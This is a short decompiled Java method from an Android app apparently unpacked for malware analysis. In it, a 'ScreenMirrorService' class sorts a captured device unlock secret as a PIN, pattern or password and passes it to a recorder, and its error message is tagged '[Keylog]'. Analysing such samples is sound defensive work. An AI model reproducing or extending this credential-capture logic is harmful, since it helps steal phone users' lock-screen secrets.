// FRAGMENTO DECOMPILADO; no es una clase independiente compilable.
// Clasifica el valor como LOCK_PIN, LOCK_PATTERN o LOCK_PASSWORD y solicita su registro.
// ev_869dbbabe40b3df5ffe167e0b23260edfb55035db687ff2f6e4759d76dff000c
// {'path': 'C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk', 'class_name': 'lyr.stable.runtime.ScreenMirrorService', 'method_name': 'F4'}

public final void F4(String str, String str2) {
    String str3;
    if (str2 == null || str2.isEmpty() || this.R5 == null) {
        return;
    }
    try {
        j5 j5Var = this.R5;
        if ("pin".equals(str)) {
            str3 = "LOCK_PIN";
        } else {
            str3 = "pattern".equals(str) ? "LOCK_PATTERN" : "LOCK_PASSWORD";
        }
        j5Var.getClass();
        if (!str3.isEmpty() && !str2.isEmpty()) {
            j5Var.l(new b5(j5Var, str3, str2, 2));
        }
    } catch (Throwable th) {
        a0.a.p(th, new StringBuilder("[Keylog] lock record fail: "), "ScreenMirror");
    }
}
